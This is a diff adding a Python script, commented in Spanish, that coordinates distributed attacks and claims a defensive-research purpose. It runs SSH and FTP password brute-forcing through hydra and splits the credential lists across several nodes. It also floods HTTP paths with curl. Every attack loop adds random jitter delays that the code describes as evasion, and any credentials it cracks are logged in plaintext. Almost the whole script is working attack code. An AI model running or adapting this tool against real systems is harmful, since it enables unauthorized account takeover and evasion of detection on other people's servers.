@@ -1,0 +1,224 @@
+#!/usr/bin/env python3
+"""
+Coordinador de Ataques Distribuidos para Investigación Defensiva
+Propósito: Simular patrones de botnet para pruebas de detección
+"""
+
+import argparse
+import asyncio
+import json
+import logging
+import random
+import time
+from datetime import datetime
+from pathlib import Path
+import subprocess
+import sys
+
+class DistributedAttackCoordinator:
+    def __init__(self, config):
+        self.config = config
+        self.node_id = config.get('node_id', 'unknown')
+        self.target_ip = config.get('target_ip')
+        self.attack_rate = config.get('attack_rate', 0.5)
+        self.log_file = config.get('log_file', f'/var/log/distributed-attack/node-{self.node_id}.log')
+        
+        # Configurar logging
+        logging.basicConfig(
+            level=logging.INFO,
+            format='%(asctime)s - Node-{{ node_id }} - %(levelname)s - %(message)s',
+            handlers=[
+                logging.FileHandler(self.log_file),
+                logging.StreamHandler()
+            ]
+        )
+        self.logger = logging.getLogger(__name__)
+        
+    def calculate_delay(self):
+        """Calcular delay con jitter para evasión"""
+        base_delay = 1.0 / self.attack_rate
+        jitter = random.uniform(0.5, 2.0)
+        return base_delay * jitter
+        
+    def generate_credentials(self, userlist, passlist):
+        """Generar combinaciones de credenciales"""
+        users = []
+        passwords = []
+        
+        try:
+            with open(userlist, 'r') as f:
+                users = [line.strip() for line in f if line.strip()]
+            with open(passlist, 'r') as f:
+                passwords = [line.strip() for line in f if line.strip()]
+        except FileNotFoundError as e:
+            self.logger.error(f"Error reading credential files: {e}")
+            return []
+            
+        # Distribuir credenciales entre nodos
+        combinations = [(u, p) for u in users for p in passwords]
+        random.shuffle(combinations)
+        
+        # Cada nodo toma un subset diferente
+        node_offset = int(self.node_id) - 1
+        node_combinations = combinations[node_offset::5]  # Asumiendo 5 nodos max
+        
+        return node_combinations
+        
+    async def ssh_attack(self, target, port, threads, userlist, passlist, duration):
+        """Ejecutar ataque SSH distribuido"""
+        self.logger.info(f"Iniciando ataque SSH contra {target}:{port}")
+        
+        credentials = self.generate_credentials(userlist, passlist)
+        end_time = time.time() + duration
+        attempt_count = 0
+        
+        while time.time() < end_time and credentials:
+            try:
+                # Tomar credenciales del pool
+                if credentials:
+                    username, password = credentials.pop(0)
+                    
+                    # Ejecutar intento con hydra
+                    cmd = [
+                        'hydra', 
+                        '-l', username, 
+                        '-p', password,
+                        '-t', str(threads),
+                        '-W', '10',
+                        f'ssh://{target}:{port}'
+                    ]
+                    
+                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+                    attempt_count += 1
+                    
+                    # Registrar intento
+                    self.logger.info(f"SSH attempt {attempt_count}: {username}:{password} -> {target}")
+                    
+                    if 'login:' in result.stdout:
+                        self.logger.info(f"SSH success: {username}:{password} -> {target}")
+                        
+                    # Delay para evasión
+                    await asyncio.sleep(self.calculate_delay())
+                    
+            except subprocess.TimeoutExpired:
+                self.logger.warning(f"SSH timeout for {username}:{password}")
+            except Exception as e:
+                self.logger.error(f"SSH error: {e}")
+                
+        self.logger.info(f"SSH attack completed. Total attempts: {attempt_count}")
+        
+    async def ftp_attack(self, target, port, threads, userlist, passlist, duration):
+        """Ejecutar ataque FTP distribuido"""
+        self.logger.info(f"Iniciando ataque FTP contra {target}:{port}")
+        
+        credentials = self.generate_credentials(userlist, passlist)
+        end_time = time.time() + duration
+        attempt_count = 0
+        
+        while time.time() < end_time and credentials:
+            try:
+                if credentials:
+                    username, password = credentials.pop(0)
+                    
+                    cmd = [
+                        'hydra', 
+                        '-l', username, 
+                        '-p', password,
+                        '-t', str(threads),
+                        f'ftp://{target}:{port}'
+                    ]
+                    
+                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+                    attempt_count += 1
+                    
+                    self.logger.info(f"FTP attempt {attempt_count}: {username}:{password} -> {target}")
+                    
+                    if 'login:' in result.stdout:
+                        self.logger.info(f"FTP success: {username}:{password} -> {target}")
+                        
+                    await asyncio.sleep(self.calculate_delay())
+                    
+            except subprocess.TimeoutExpired:
+                self.logger.warning(f"FTP timeout for {username}:{password}")
+            except Exception as e:
+                self.logger.error(f"FTP error: {e}")
+                
+        self.logger.info(f"FTP attack completed. Total attempts: {attempt_count}")
+        
+    async def http_attack(self, target, port, threads, paths, duration):
+        """Ejecutar ataque HTTP distribuido"""
+        self.logger.info(f"Iniciando ataque HTTP contra {target}:{port}")
+        
+        end_time = time.time() + duration
+        attempt_count = 0
+        
+        while time.time() < end_time:
+            try:
+                path = random.choice(paths.split(','))
+                
+                cmd = [
+                    'curl',
+                    '-s',
+                    '-m', '10',
+                    '-A', f'Mozilla/5.0 (Node-{self.node_id})',
+                    f'http://{target}:{port}{path}'
+                ]
+                
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+                attempt_count += 1
+                
+                self.logger.info(f"HTTP attempt {attempt_count}: {path} -> {target}")
+                
+                await asyncio.sleep(self.calculate_delay())
+                
+            except subprocess.TimeoutExpired:
+                self.logger.warning(f"HTTP timeout for {path}")
+            except Exception as e:
+                self.logger.error(f"HTTP error: {e}")
+                
+        self.logger.info(f"HTTP attack completed. Total attempts: {attempt_count}")
+
+def main():
+    parser = argparse.ArgumentParser(description='Coordinador de Ataques Distribuidos')
+    parser.add_argument('--service', required=True, choices=['ssh', 'ftp', 'http'])
+    parser.add_argument('--target', required=True, help='IP objetivo')
+    parser.add_argument('--port', type=int, required=True, help='Puerto objetivo')
+    parser.add_argument('--threads', type=int, default=4, help='Número de threads')
+    parser.add_argument('--userlist', help='Lista de usuarios')
+    parser.add_argument('--passlist', help='Lista de passwords')
+    parser.add_argument('--paths', help='Paths HTTP (separados por coma)')
+    parser.add_argument('--duration', type=int, default=300, help='Duración en segundos')
+    parser.add_argument('--rate', type=float, default=0.5, help='Tasa de ataque')
+    parser.add_argument('--node-id', required=True, help='ID del nodo')
+    parser.add_argument('--log-file', help='Archivo de log')
+    
+    args = parser.parse_args()
+    
+    config = {
+        'node_id': args.node_id,
+        'target_ip': args.target,
+        'attack_rate': args.rate,
+        'log_file': args.log_file or f'/var/log/distributed-attack/node-{args.node_id}.log'
+    }
+    
+    coordinator = DistributedAttackCoordinator(config)
+    
+    # Ejecutar ataque según el servicio
+    if args.service == 'ssh':
+        asyncio.run(coordinator.ssh_attack(
+            args.target, args.port, args.threads, 
+            args.userlist, args.passlist, args.duration
+        ))
+    elif args.service == 'ftp':
+        asyncio.run(coordinator.ftp_attack(
+            args.target, args.port, args.threads,
+            args.userlist, args.passlist, args.duration
+        ))
+    elif args.service == 'http':
+        asyncio.run(coordinator.http_attack(
+            args.target, args.port, args.threads,
+            args.paths, args.duration
+        ))
+
+if __name__ == '__main__':
+    main()
